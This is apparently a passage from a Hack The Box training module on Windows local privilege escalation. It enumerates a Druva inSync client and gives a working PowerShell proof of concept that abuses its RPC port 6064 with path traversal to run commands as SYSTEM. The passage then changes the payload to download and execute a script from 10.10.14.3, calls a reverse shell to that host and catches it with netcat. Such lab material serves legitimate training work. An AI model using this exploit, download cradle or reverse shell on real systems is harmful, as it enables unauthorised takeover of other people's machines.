#### Enumerating Installed Programs

```cmd
C:\htb> wmic product get name
```
#### Enumerating Local Ports

```cmd
C:\htb> netstat -ano | findstr 6064
```
#### Enumerating Process ID

```powershell
PS C:\htb> get-process -Id 3324
```
#### Enumerating Running Service

```powershell
PS C:\htb> get-service | ? {$_.DisplayName -like 'Druva*'}
```
## Druva inSync Windows Client Local Privilege Escalation Example
#### Druva inSync PowerShell PoC

With this information in hand, let's try out the exploit PoC, which is this short PowerShell snippet.

```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```
#### Modifying PowerShell PoC

Let's try this with [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).

```shell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
```

```powershell
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"
```
#### Catching a SYSTEM Shell

```shell
3kjS@htb[/htb]$ nc -lvnp 9443
```